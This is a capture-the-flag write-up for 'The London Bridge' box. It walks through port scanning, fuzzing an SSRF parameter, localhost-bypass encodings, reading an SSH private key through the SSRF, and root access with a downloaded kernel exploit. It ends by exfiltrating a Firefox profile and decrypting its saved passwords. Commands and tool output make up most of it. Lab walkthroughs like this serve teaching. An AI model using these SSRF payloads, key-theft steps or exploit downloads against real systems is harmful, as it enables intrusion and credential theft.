## The London Bridge - Writeup

An easy one!

### Port scan

`sudo nmap --top-ports 1000 -oN nmap_initial.txt IP_ADDRESS`
Found ports:
```
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

### Checked the web pages

- Found web app
- Performed mannual enumeration. Found `/contact` `/feedback` `/gallery` pages and `/upload` `/feedback` endpoints POST
- Used `gobuster` to find more directories and files `gobuster dir -u http://IP_ADDRESS:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.txt`
  - Found `/dejaview` which has a form that accepts image URL
  - Found the following call which routes to `/view_image` endpoint
  ```bash
  curl ^"http://10.66.131.250:8080/view_image^" ^
    -H ^"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8^" ^
    -H ^"Accept-Language: en-US,en;q=0.9^" ^
    -H ^"Cache-Control: max-age=0^" ^
    -H ^"Connection: keep-alive^" ^
    -H ^"Content-Type: application/x-www-form-urlencoded^" ^
    -H ^"Origin: http://10.66.131.250:8080^" ^
    -H ^"Referer: http://10.66.131.250:8080/view_image^" ^
    -H ^"Sec-GPC: 1^" ^
    -H ^"Upgrade-Insecure-Requests: 1^" ^
    -H ^"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36^" ^
    --data-raw ^"image_url=^%^2Fuploads^%^2F04.jpg^" ^
    --insecure
  ```
- Also,
```bash
curl 'http://10.66.131.250:8080/feedback' \
`  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
`  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://10.66.131.250:8080' \
  -H 'Referer: http://10.66.131.250:8080/contact' \
  -H 'Sec-GPC: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' \
  --data-raw 'name=aaaddd&email=fffggg&message=dddd+cccc' \
  --insecure
```
- Attempted SSRF on `/feedback` and `/view_image` by embedding `<script src='http://MY_SERVER/name.txt'></script>` => ❌
- Needed a hint here: attempted to fuzz the `/feedback` and `/view_image` endpoints with different params using `ffuf`:
  `ffuf -u http://IP_ADDRESS:8080/feedback -X POST -d "FUZZ=testing" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o ffuf_feedback.txt`
  `ffuf -u http://IP_ADDRESS:8080/view_image -X POST -d "FUZZ=testing" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o ffuf_view_image.txt`
  `ffuf -u http://IP_ADDRESS:8080/view_image -X POST -d "FUZZ=/uploads/04.jpg" -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -o ffuf_view_image_2.txt`
  Found `www` param in `/view_image` endpoint
  - Tested SSRF again with `www` param: found a hit on my local server logs on req:
  ```bash
  curl -X POST http://IP_ADDRESS:8080/view_image \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-raw "www=http://127.0.0.1:8080/name.txt"
  ```

### SSRF Exploitation

- Tested SSRF again with `www` param: tried accessing end-points resulting in 405 
```bash
curl -X POST http://IP_ADDRESS:8080/view_image \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-raw "www=http://127.0.0.1:8080/gallery"
curl -X POST http://IP_ADDRESS:8080/view_image \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-raw "www=http://127.0.0.1:8080/view_image"
```
Got `not allowed`! Maybe a blacklist/whitelist? Went through `https://highon.coffee/blog/ssrf-cheat-sheet/` and performed fuzz across common ports and ip address variations
```sh
─[parrot@parrot]─[~/Downloads]
└──╼ $ffuf -u http://10.65.132.48:8080/view_image -X POST -d "www=http://FUZZ" -H 'Content-Type: application/x-www-form-urlencoded' -w ~/Downloads/londonbridge/ssrfbypasswl.txt -o ffuf_view_image_fuzzwww.txt -t 5 -fw 27 -timeout 5

        /'___\  /'___\           /'___\       
      /\ \__/ /\ \__/  __  __  /\ \__/       
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
        \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

      v2.1.0-dev
________________________________________________

:: Method           : POST
:: URL              : http://10.65.132.48:8080/view_image
:: Wordlist         : FUZZ: /home/parrot/Downloads/londonbridge/ssrfbypasswl.txt
:: Header           : Content-Type: application/x-www-form-urlencoded
:: Data             : www=http://FUZZ
:: Output file      : ffuf_view_image_fuzzwww.txt
:: File format      : json
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 5
:: Threads          : 5
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response words: 27
________________________________________________

0                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 225ms]
[::]:8080/              [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 240ms]
[::]:25/ SMTP           [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 232ms]
127.1:8080              [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 234ms]
[0000::1]:8080/         [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 235ms]
[::]:3128/ Squid        [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 248ms]
①②⑦.⓪.⓪.⓪               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 249ms]
127.127.127.127         [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 226ms]
127.0.1.3               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 228ms]
127.0.0.0               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 229ms]
2130706433/             [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 226ms]
017700000001            [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 227ms]
0x7f000001/             [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 223ms]
st:00011211aaaa         [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 220ms]
0/                      [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 229ms]
127.1                   [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 224ms]
127.0.1                 [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 231ms]
127.1.1.1:8080\@127.2.2.2:8080/ [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 224ms]
1.1.1.1 &@2.2.2.2# @3.3.3.3/ [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 378ms]
127.1.1.1:8080\@@127.2.2.2:8080/ [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 223ms]
127.1.1.1:8080:\@@127.2.2.2:8080/ [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 225ms]
127.1.1.1:8080#\@127.2.2.2:8080/ [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 225ms]
:: Progress: [52/52] :: Job [1/1] :: 2 req/sec :: Duration: [0:00:11] :: Errors: 3 ::
```
Valid one I used : `127.1:80`
- Performed directory enumeration against `127.1:80` using 
```sh
┌─[parrot@parrot]─[~/Downloads/londonbridge]
└──╼ $ffuf -u http://10.65.132.48:8080/view_image -X POST -d "www=http://127.1:80/FUZZ" -H 'Content-Type: application/x-www-form-urlencoded' -w ./raft-words.txt -o ffufssrfdirscanat80.txt -t 5 -timeout 3 -fw 96

        /'___\  /'___\           /'___\       
      /\ \__/ /\ \__/  __  __  /\ \__/       
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
        \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

      v2.1.0-dev
________________________________________________

:: Method           : POST
:: URL              : http://10.65.132.48:8080/view_image
:: Wordlist         : FUZZ: /home/parrot/Downloads/londonbridge/raft-words.txt
:: Header           : Content-Type: application/x-www-form-urlencoded
:: Data             : www=http://127.1:80/FUZZ
:: Output file      : ffufssrfdirscanat80.txt
:: File format      : json
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 3
:: Threads          : 5
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response words: 96
________________________________________________

templates               [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 245ms]
uploads                 [Status: 200, Size: 630, Words: 23, Lines: 22, Duration: 238ms]
static                  [Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 271ms]
.                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 237ms]
.cache                  [Status: 200, Size: 474, Words: 19, Lines: 18, Duration: 232ms]
.local                  [Status: 200, Size: 414, Words: 19, Lines: 18, Duration: 226ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 236ms]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 231ms]
.bash_logout            [Status: 200, Size: 220, Words: 35, Lines: 8, Duration: 225ms]
.bash_history           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 227ms]
m4m_loadurl             [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 289ms]
macro                   [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 286ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

### Gaining Initial Access

- Accessed `id_rsa` && `authorized_keys` files from `.ssh` folder using:
```bash
curl -X POST http://IP_ADDRESS:8080/view_image \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-raw "www=http://127.1:80/.ssh/id_rsa"
```
- Found the user: `beth` from `.bashrc` file and `/etc/passwd` file
- Used it to get foothold within the server:
```bash
chmod 600 id_rsa
ssh -i id_rsa beth@IP_ADDRESS -p 22
```
- Found the user flag: `/home/beth/__pycache__/user.txt`
  
### Privilege Escalation

- Found vulnerable OS: `uname -a` => `Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux` and exploit at `https://github.com/zerozenxlabs/ZDI-24-020/tree/main` to gain root access
  - `wget https://raw.githubusercontent.com/zerozenxlabs/ZDI-24-020/main/exploit.c`
  - `gcc -o exploit exploit.c -lpthread`
  - `./exploit ubuntu`
- Found the root flag `/root/.root.txt`

### Checked `charles` user's home directory

- Found `.mozilla/firefox` profiles
- Zippped the folder to transfer to local machine
```bash
gzip -r mozdawg.tar.gz .mozilla
python3 -m http.server

# locally
wget http://IP_ADDRESS:8000/mozdawg.tar.gz
tar -xzvf mozdawg.tar.gz
chmod -R 700 mozdawg
cd mozdawg/home/charles/.mozilla/firefox/8k3bf3zp.charles
```
- Used `firefox_decrypt` to decrypt the firefox profiles and found saved passwords including `charles` user's ssh password
```bash
┌─[parrot@parrot]─[~/Downloads/londonbridge/home/charles/mozilla/firefox/8k3bf3zp.charles]
└──╼ $python3 firefox_decrypt/firefox_decrypt.py .
2026-01-09 11:56:14,089 - WARNING - profile.ini not found in .
2026-01-09 11:56:14,090 - WARNING - Continuing and assuming '.' is a profile location

Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: 'xxxxxxxxxxxxxx'
```

We done!